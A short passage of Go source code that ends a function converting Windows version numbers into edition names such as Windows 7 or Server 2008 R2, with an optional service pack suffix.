		WinVersion = "Windows 8"
	} else if OsVersion[0] == 6 && OsVersion[1] == 1 && OsVersion[2] != 0x0000001 {
		WinVersion = "Windows Server 2008 R2"
	} else if OsVersion[0] == 6 && OsVersion[1] == 1 && OsVersion[2] == 0x0000001 {
		WinVersion = "Windows 7"
	}

	if OsVersion[3] != 0 {
		WinVersion += " Service Pack " + strconv.Itoa(OsVersion[3])
	}

	return WinVersion
}
